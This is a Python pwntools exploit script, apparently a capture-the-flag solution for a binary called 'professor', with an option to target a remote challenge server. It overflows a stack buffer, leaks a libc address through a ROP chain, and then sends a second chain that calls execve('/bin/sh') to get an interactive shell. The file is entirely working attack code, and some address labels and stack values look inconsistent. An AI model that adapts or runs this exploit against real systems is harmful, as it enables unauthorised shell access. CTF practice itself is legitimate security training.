#!/usr/bin/env python3

from pwn import *

custom_libpthread_path = "./libpthread-2.31.so"
preload_env = {"LD_PRELOAD": custom_libpthread_path}
libpthread = ELF("./libpthread-2.31.so")
libc = ELF("./libc.so.6")
context.binary = elf = ELF('./professor')
context.log_level = 'DEBUG'

if args['REMOTE']: 
    io = remote('pwnable.co.il', 9003)
else: 
    io = process([elf.path], env=preload_env)
    
    if args['GDB']:
        gdb.attach(io)
    

offset = 56 * b'A'
pop_rdi = 0x0000000000401393
ret = 0x000000000040101a
puts_plt_address = 0x000000404020
puts_got_address = 0x4010a0
get_plt_address = 0x000000404030
get_got_address = 0x4010c0
main = 0x00000000004012b5
jump_back_to_gets = 0x040123b

payload = offset
payload += p64(pop_rdi)
payload += p64(get_plt_address)
payload += p64(puts_got_address)
payload += p64(ret)
payload += p64(jump_back_to_gets)
payload += b'A' * 0x2000

io.recvuntil(b'wrong?\n')
io.sendline(payload)
leaked_gets = io.recv(6) + b'\x00' * 2 
leaked_gets = u64(leaked_gets)

libc_base_address_x = leaked_gets - 539040 
libc_base_address = leaked_gets - 0x619a0
system = libc_base_address + 1983216 
execve = libc_base_address + 1983216 - 1192272 
exit_f = libc_base_address + 150128
bin_sh = libc_base_address_x + 0x1b45bd
pop_rax = libc_base_address_x + 0x0000000000047400
pop_rsi = libc_base_address_x + 0x000000000002604f
pop_rdx = libc_base_address_x + 0x0000000000119241

payload = offset
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(0)
payload += p64(execve)


io.recv()
io.sendline(payload)

io.interactive()